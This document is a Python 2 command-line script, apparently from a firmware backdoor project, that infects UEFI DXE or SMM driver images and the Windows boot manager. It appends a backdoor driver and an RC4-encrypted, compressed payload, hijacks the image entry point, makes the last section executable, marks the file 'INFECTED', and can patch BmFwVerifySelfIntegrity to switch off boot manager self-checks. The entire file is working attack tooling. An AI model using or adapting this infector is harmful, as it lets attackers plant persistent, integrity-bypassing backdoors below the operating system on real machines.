#!/usr/bin/env python

import sys, os, time, random
from struct import pack, unpack
from optparse import OptionParser, make_option

# See struct _INFECTOR_CONFIG in DmaBackdoorHv.h
INFECTOR_CONFIG_SECTION = '.conf'
INFECTOR_CONFIG_FMT = 'QQQQQ'
INFECTOR_CONFIG_LEN = 8 + 8 + 8 + 8 + 8

# IMAGE_DOS_HEADER.e_res magic constant to mark infected file
INFECTOR_SIGN = 'INFECTED'

PAYLOAD_KEY_LEN = 0x10

align_up = lambda x, a: ((x + a - 1) // a) * a
align_down = lambda x, a: (x // a) * a

class RC4:

    def __init__(self, key):

        self.x = self.y = 0        
        self.s = range(256)

        j = 0

        # populate S-box
        for i in range(256):

            j = (j + self.s[i] + ord(key[i % len(key)])) % 256

            # swap
            self.s[i], self.s[j] = self.s[j], self.s[i]

    def crypt(self, data):

        ret = ''
    
        # encrypt/decrypt data
        for char in data:
        
            self.x = (self.x + 1) % 256
            self.y = (self.y + self.s[self.x]) % 256
            
            # swap
            self.s[self.x], self.s[self.y] = self.s[self.y], self.s[self.x]
            
            ret += chr(ord(char) ^ self.s[(self.s[self.x] + self.s[self.y]) % 256])

        return ret

def patch_win_boot_mgr_integrity(data):

    for i in range(0, len(data) - 0x100):

        '''
            Check for bootmgr!BmFwVerifySelfIntegrity() signature:

                mov     [rsp-30h+arg_0], ecx
                push    rbp
                push    rbx
                push    rsi
                push    rdi
                push    r13
                push    r14
                mov     rbp, rsp
                sub     rsp, 68h
                mov     rax, cs:qword_1014DE10
                xor     edi, edi
                and     [rbp+Src], 0
                and     [rbp+arg_10], 0
                or      [rbp+arg_0], 0FFFFFFFFh
                or      [rbp+arg_8], 0FFFFFFFFh
        '''

        if data[i + 0x00] == '\x89' and data[i + 0x01] == '\x4c' and \
           data[i + 0x26] == '\x83' and data[i + 0x27] == '\x4d' and data[i + 0x28] == '\x38' and data[i + 0x29] == '\xff' and \
           data[i + 0x2a] == '\x83' and data[i + 0x2b] == '\x4d' and data[i + 0x2c] == '\x40' and data[i + 0x2d] == '\xff':

            # xor eax, eax / ret
            patch = '\x33\xc0\xc3'

            print('[+] bootmgr!BmFwVerifySelfIntegrity() signature found at offset 0x%.8x' % i)

            # patch the function to disable self check
            return data[: i] + patch + data[i + len(patch) :]

    raise Exception('Unable to find bootmgr!BmFwVerifySelfIntegrity() function')

def infect(src, dxe_driver, dst = None, payload = None, patch_integrity = False):

    try:

        import pefile

    except ImportError:

        raise ImportError('pefile is not installed')

    def _infector_config_offset(pe):
        
        for section in pe.sections:

            # find .conf section of DXE driver image
            if section.Name[: len(INFECTOR_CONFIG_SECTION)] == INFECTOR_CONFIG_SECTION:

                return section.PointerToRawData

        raise Exception('Unable to find %s section' % INFECTOR_CONFIG_SECTION)

    def _infector_config_get(pe, data):

        offs = _infector_config_offset(pe)
        
        return unpack(INFECTOR_CONFIG_FMT, data[offs : offs + INFECTOR_CONFIG_LEN])        

    def _infector_config_set(pe, data, *args):

        offs = _infector_config_offset(pe)

        return data[: offs] + \
               pack(INFECTOR_CONFIG_FMT, *args) + \
               data[offs + INFECTOR_CONFIG_LEN :]

    def _payload_data_set(data, payload_data):

        IMAGE_DOS_HEADER_e_res

    # load target image
    pe_src = pefile.PE(src)    
    
    if pe_src.DOS_HEADER.e_res == INFECTOR_SIGN:

        raise Exception('%s is already infected' % src)            
    
    # load DXE driver image
    pe_dxe = pefile.PE(dxe_driver)

    if pe_src.FILE_HEADER.Machine != pe_dxe.FILE_HEADER.Machine:

        raise Exception('Architecture missmatch')

    if payload is not None:

        try:

            import lznt1

        except ImportError:

            raise ImportError('lznt1 is not installed')
        
        with open(payload, 'rb') as fd:

            # read payload image data
            payload_data = fd.read()
            payload_data_len = len(payload_data)

        print('%d bytes of payload image read' % payload_data_len)

        # compress payload image
        payload_data = lznt1.compress(payload_data)

        print('%d bytes of payload image after the compression' % len(payload_data))

        # generate payload encryption key
        key = ''.join([chr(random.randrange(0x01, 0xff)) for i in range(0, PAYLOAD_KEY_LEN)])

        # prepare _PAYLOAD_HEADER structure
        payload_data = pack('I', payload_data_len) + key + RC4(key).crypt(payload_data)

        # write _BACKDOOR_PAYLOAD structure
        pe_dxe.DOS_HEADER.e_res = pack('II', os.path.getsize(dxe_driver), len(payload_data))

        # get DXE driver image data + payload
        data = pe_dxe.write() + payload_data

    else:

        # get DXE driver image data
        data = pe_dxe.write()

    # read _INFECTOR_CONFIG, this structure is located at .conf section of DXE driver image
    val_1, val_2, val_3, conf_ep_new, conf_ep_old = _infector_config_get(pe_dxe, data) 

    last_section = None
    for section in pe_src.sections:

        # find last section of target image
        last_section = section

    if last_section.Misc_VirtualSize > last_section.SizeOfRawData:

        raise Exception('Last section virtual size must be less or equal than raw size')

    raw_size = last_section.PointerToRawData + last_section.SizeOfRawData 

    # save original entry point address of target image
    conf_ep_old = pe_src.OPTIONAL_HEADER.AddressOfEntryPoint

    print('Original entry point RVA is 0x%.8x' % conf_ep_old )
    print('Original %s virtual size is 0x%.8x' % \
          (last_section.Name.split('\0')[0], last_section.Misc_VirtualSize))

    print('Original image size is 0x%.8x' % pe_src.OPTIONAL_HEADER.SizeOfImage)

    # write updated _INFECTOR_CONFIG back to the DXE driver image
    data = _infector_config_set(pe_dxe, data, val_1, val_2, val_3, conf_ep_new, conf_ep_old)

    # add padding
    data += '\0' * (align_up(len(data), pe_src.OPTIONAL_HEADER.FileAlignment) - len(data))

    # set new entry point of target image
    pe_src.OPTIONAL_HEADER.AddressOfEntryPoint = \
        last_section.VirtualAddress + last_section.SizeOfRawData + conf_ep_new    

    # update last section size
    last_section.SizeOfRawData += len(data)
    last_section.Misc_VirtualSize = last_section.SizeOfRawData

    # make it executable
    last_section.Characteristics = pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_READ'] | \
                                   pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_WRITE'] | \
                                   pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']  

    print('Characteristics of %s section was changed to RWX' % last_section.Name.split('\0')[0])

    # update image headers
    pe_src.OPTIONAL_HEADER.SizeOfImage = last_section.VirtualAddress + last_section.Misc_VirtualSize
    pe_src.OPTIONAL_HEADER.SizeOfImage = align_up(pe_src.OPTIONAL_HEADER.SizeOfImage, pe_src.OPTIONAL_HEADER.SectionAlignment)
    pe_src.DOS_HEADER.e_res = INFECTOR_SIGN    

    print('New entry point RVA is 0x%.8x' % pe_src.OPTIONAL_HEADER.AddressOfEntryPoint)
    print('New %s virtual size is 0x%.8x' % \
          (last_section.Name.split('\0')[0], last_section.Misc_VirtualSize))

    print('New image size is 0x%.8x' % pe_src.OPTIONAL_HEADER.SizeOfImage)

    # get infected image data
    data = pe_src.write()[: raw_size] + data

    if patch_integrity:

        # patch self-integrity checks of windows boot manager
        data = patch_win_boot_mgr_integrity(str(data))

    if dst is not None:

        with open(dst, 'wb') as fd:

            # save infected image to the file
            fd.write(data)

    return data

def main():    

    option_list = [

        make_option('-i', '--infect', dest = 'infect', default = None,
            help = 'infect existing DXE, SMM or combined driver image'),

        make_option('-p', '--payload', dest = 'payload', default = None,
            help = 'payload image path'),

        make_option('-d', '--dxe-driver', dest = 'dxe_driver', default = None,
            help = 'DXE driver image path'),

        make_option('-o', '--output', dest = 'output', default = None,
            help = 'file path to save infected file'),

        make_option('--patch-integrity-checks', dest = 'patch_integrity', default = False, action = 'store_true',
            help = 'file path to save infected file')
    ]

    parser = OptionParser(option_list = option_list)
    options, args = parser.parse_args()

    if options.infect is not None:

        if options.dxe_driver is None:

            print('ERROR: --dxe-driver must be specified')
            return -1

        print('[+] Target image to infect: %s' % options.infect)
        print('[+] DXE driver: %s' % options.dxe_driver)

        if options.payload is not None:

            print('[+] Payload image: %s' % options.payload)

        if options.output is None:

            backup = options.infect + '.bak'
            options.output = options.infect

            print('[+] Backup: %s' % backup)

            # backup original file
            shutil.copyfile(options.infect, backup)

        print('[+] Output file: %s' % options.output)

        try:

            # infect source file with specified DXE driver
            if infect(options.infect, options.dxe_driver, 
                      dst = options.output, payload = options.payload,
                      patch_integrity = options.patch_integrity) is not None:

                print('[+] DONE')

        except Exception, why:

            print('ERROR: %s' % str(why))

        return 0

    else:

        print('No actions specified, try --help')
        return -1    
    
if __name__ == '__main__':
    
    exit(main())

#
# EoF
#
